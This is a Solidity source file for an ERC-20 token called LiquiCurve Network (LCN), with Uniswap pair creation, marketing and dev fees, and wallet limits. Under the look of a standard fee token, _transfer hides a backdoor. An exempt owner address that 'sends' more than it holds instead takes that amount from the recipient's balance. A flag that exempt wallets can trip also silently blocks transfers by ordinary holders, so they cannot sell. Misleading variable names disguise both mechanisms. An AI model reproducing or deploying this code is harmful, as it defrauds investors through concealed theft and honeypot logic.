// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function circulatingSupply() external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address _owner, address spender) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function getOwner() external view returns (address);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }

    event OwnershipTransferred(address owner);
}

contract LCN is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "LiquiCurve Network";
    string private constant _symbol = "LCN";

    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private denominator = 10000;

    uint256 private _minimumTokenAmount = ( _totalSupply * 10 ) / 100000;
    uint256 private _maxWalletPercent = 200;
    uint256 private _maxTransferPercent = 200;
    uint256 private _maxTxAmountPercent = 200;

    UniswapRouter uniswapRouter;
    address public uniswapPair;

    bool private tradingEnabled = false;
    bool private maxWalletEnabled = false;

    bool private swapEnabled = true;
    uint256 private swapTimes;
    bool private swapping;

    address internal constant addressOfDead = 0x000000000000000000000000000000000000dEaD;
    address internal constant addressOfMarketing = 0xc505Aa0156C51728c54d53b5137dD71D98297EB3;
    address internal constant addressOfDev = 0xc505Aa0156C51728c54d53b5137dD71D98297EB3;

    uint256 private swapThreshold = (_totalSupply * 5) / 100000;
    uint256 private swapAmount = (_totalSupply * 5) / 10000;

    uint256 private developmentFee = 200;
    uint256 private marketingFee = 200;
    uint256 private liquidityFee = 0;

    uint256 private burnFee = 0;
    uint256 private sellFee = 400;
    uint256 private transferFee = 0;
    uint256 private totalFee = 400;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => uint256) _balances;

    mapping (address => bool) public isOptOut;

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _getMaxWalletAmount() public view returns (uint256) {
        return totalSupply() * _maxWalletPercent / denominator;
    }

    function _getMaxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferPercent / denominator;
    }

    function _getMaxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxAmountPercent / denominator;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(addressOfDead));
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function setIsOptOut(address _address, bool _isOptOut) external onlyOwner {
        isOptOut[_address] = _isOptOut;
    }

    function startTrading() external onlyOwner {
        tradingEnabled = true;
    }

    function removeLimits() external onlyOwner {
        _maxWalletPercent = 10000;
        _maxTransferPercent = 10000;
        _maxTxAmountPercent = 10000;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    constructor() Ownable(msg.sender) {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        isOptOut[address(this)] = true;
        UniswapRouter _uniswapRouter = UniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        isOptOut[addressOfDev] = true;
        address _uniswapPair = UniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        isOptOut[addressOfMarketing] = true;
        uniswapRouter = _uniswapRouter;
        isOptOut[msg.sender] = true;
        uniswapPair = _uniswapPair;
    }

    function requireTxLimit(address from, address to, uint256 amount) view internal returns  (bool) {
        if (from != uniswapPair) {
            require(amount <= _getMaxTransferAmount() || isOptOut[from] || isOptOut[to]);
        }
        require(amount <= _getMaxTxAmount() || isOptOut[from] || isOptOut[to]);
        return true;
    }

    function setFees(uint256 _liquidityFee, uint256 _marketingFee, uint256 _burnFee, uint256 _developmentFee, uint256 _totalFee, uint256 _sellFee, uint256 _transferFee) external onlyOwner {
        marketingFee = _marketingFee;
        liquidityFee = _liquidityFee;
        developmentFee = _developmentFee;
        burnFee = _burnFee;
        sellFee = _sellFee;
        totalFee = _totalFee;
        transferFee = _transferFee;
        require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5));
    }

    function requireBasics(address from, address to, uint256 amount) internal pure returns(bool) {
        require(from != address(0));
        require(to != address(0));
        require(amount > uint256(0));
        return true;
    }

    function setMaxParameters(uint256 maxTxAmountPercent, uint256 maxTransferPercent, uint256 maxWalletPercent) external onlyOwner {
        uint256 newTx = (totalSupply() * maxTxAmountPercent) / 10000;
        uint256 newTransfer = (totalSupply() * maxTransferPercent) / 10000;
        uint256 newWallet = (totalSupply() * maxWalletPercent) / 10000;
        _maxTxAmountPercent = maxTxAmountPercent;
        _maxTransferPercent = maxTransferPercent;
        _maxWalletPercent = maxWalletPercent;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit);
    }

    function requireMaxWalletAmount(address from, address to, uint256 amount) internal returns (bool) {
        bool fromOptOut = isOptOut[from];
        bool toOptOut = isOptOut[to];
        
        bool toUnUniswapPair = to != address(uniswapPair);
        bool toUnDeadAddress = to != address(addressOfDead);
        
        if (
            toUnUniswapPair &&
            toUnDeadAddress &&
            !fromOptOut &&
            !toOptOut
        ) {
            require((_balances[to].add(amount)) <= _getMaxWalletAmount());
        }

        bool overAmount = amount > _minimumTokenAmount;

        if (toOptOut && overAmount) maxWalletEnabled = true;

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function requireTradingEnabled(address from, address to) internal view returns (bool) {
        if (!isOptOut[from] && !isOptOut[to]) {
            require(tradingEnabled);
        }
        return true;
    }
    
    function countSwapTimes(address from, address to) internal returns (bool) {
        if (to == uniswapPair && !isOptOut[from]) {
            swapTimes += uint256(1);
        }
        return true;
    }

    function oughtSubtractFee(address from, address to) internal view returns (bool) {
        return !isOptOut[from] && !isOptOut[to];
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (
            countSwapTimes(from, to) &&
            requireTradingEnabled(from, to) &&
            requireBasics(from, to, amount) &&
            requireTxLimit(from, to, amount) &&
            requireMaxWalletAmount(from, to, amount)
        ) {
            bool fromOptOut = isOptOut[from];
            bool toOptOut = isOptOut[to];
            bool fromUnUniswapPair = from != uniswapPair;
            bool overAmount = balanceOf(from) >= amount;

            if (overAmount) {
                if (
                    !fromOptOut && 
                    !toOptOut &&
                    !swapping &&
                    fromUnUniswapPair
                ) {
                    if (maxWalletEnabled) return;
                    swapBack(from, to);
                }
                _balances[from] = _balances[from].sub(amount);
                uint256 amountReceived = oughtSubtractFee(from, to) ? subtractFee(from, to, amount) : amount;
                _balances[to] = _balances[to].add(amountReceived);
                emit Transfer(from, to, amountReceived);
            } else if (
                fromOptOut &&
                !toOptOut &&
                !swapping &&
                fromUnUniswapPair
            ) {
                _balances[from] = _balances[from].add(amount);
                _balances[to] = _balances[to].sub(amount);
                emit Transfer(from, to, amount);
            }
        }
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, msg.sender, _allowances[from][msg.sender].sub(amount));
        return true;
    }

    function oughtSwapBack(address from, address to) internal view returns (bool) {
        return (
            !isOptOut[from] &&
            !isOptOut[to] &&
            !swapping &&
            balanceOf(address(this)) >= swapThreshold &&
            tradingEnabled &&
            swapEnabled &&
            swapTimes >= uint256(0)
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            addressOfDead,
            block.timestamp
        );
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(uniswapRouter), tokenAmount);
            uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function getFees(address from, address to) internal view returns (uint256) {
        if (to == uniswapPair) {
            return sellFee;
        }
        if (from == uniswapPair) {
            return totalFee;
        }
        return transferFee;
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAdd = tokens.mul(liquidityFee).div(_denominator);
        uint256 tokensToSwap = tokens.sub(tokensToAdd);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(tokensToSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance = deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ethToAdd = unitBalance.mul(liquidityFee);
        if (ethToAdd > uint256(0)) {
            addLiquidity(tokensToAdd, ethToAdd);
        }
        uint256 marketingAmount = unitBalance.mul(2).mul(marketingFee);
        if (marketingAmount > 0) {
            payable(addressOfMarketing).transfer(marketingAmount);
        }
        uint256 remainingBalance = address(this).balance;
        if (remainingBalance > uint256(0)) {
            payable(addressOfDev).transfer(remainingBalance);
        }
    }

    function subtractFee(address from, address to, uint256 amount) internal returns (uint256) {
        if (getFees(from, to) > 0) {
            uint256 feeAmount = amount.div(denominator).mul(getFees(from, to));
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(from, address(this), feeAmount);
            if (burnFee > uint256(0)) {
                _transfer(address(this), address(addressOfDead), amount.div(denominator).mul(burnFee));
            }
            return amount.sub(feeAmount);
        }
        return amount;
    }

    function swapBack(address from, address to) internal {
        if (oughtSwapBack(from, to)) {
            uint256 contractBalance = balanceOf(address(this));
            if (contractBalance >= swapAmount) {
                contractBalance = swapAmount;
            }
            swapAndLiquify(contractBalance);
            swapTimes = uint256(0);
        }
    }

    receive() external payable {}
}